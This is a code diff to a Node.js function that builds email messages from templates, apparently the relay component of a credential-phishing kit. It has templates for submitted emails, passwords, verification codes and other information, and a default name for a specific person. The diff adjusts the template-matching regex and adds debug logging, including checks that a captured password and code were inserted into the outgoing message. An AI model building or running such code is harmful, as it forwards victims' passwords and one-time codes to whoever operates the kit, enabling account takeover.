@@ -10,15 +10,19 @@ function getEmailTemplate(templateType, data) {
   const templatePath = path.join(__dirname, '..', 'email-template.html');
   let template = fs.readFileSync(templatePath, 'utf8');
   
-  // Extract the specific template
-  const templateRegex = new RegExp(`<div id="template-${templateType}"[^>]*>([\\s\\S]*?)</div>`);
+  // Extract the specific template - extract content inside the div
+  const templateRegex = new RegExp(`<div id="template-${templateType}">([\\s\\S]*?)</div>`);
   const match = template.match(templateRegex);
   
   if (!match) {
+    console.error('Template not found:', templateType);
     throw new Error(`Template ${templateType} not found`);
   }
   
   let specificTemplate = match[1];
+  
+  console.log('Extracted template length:', specificTemplate.length);
+  console.log('Template contains placeholders:', specificTemplate.includes('{{'));
   
   // Replace placeholders based on template type
   const timestamp = new Date().toISOString();
@@ -35,18 +39,21 @@ function getEmailTemplate(templateType, data) {
       specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
       specificTemplate = specificTemplate.replace(/\{\{email\}\}/g, data.email || 'Not provided');
       specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
+      console.log('Email template after replacement:', specificTemplate.includes(data.email || 'Not provided'));
       break;
       
     case 'password-submission':
       specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
       specificTemplate = specificTemplate.replace(/\{\{password\}\}/g, data.password || 'Not provided');
       specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
+      console.log('Password template after replacement:', specificTemplate.includes(data.password || 'Not provided'));
       break;
       
     case 'verification-code':
       specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
       specificTemplate = specificTemplate.replace(/\{\{code\}\}/g, data.code || 'Not provided');
       specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
+      console.log('Code template after replacement:', specificTemplate.includes(data.code || 'Not provided'));
       break;
       
     case 'information-submission':
@@ -60,6 +67,7 @@ function getEmailTemplate(templateType, data) {
       throw new Error(`Unknown template type: ${templateType}`);
   }
   
+  console.log('Final template still has placeholders:', specificTemplate.includes('{{'));
   return specificTemplate;
 }
 
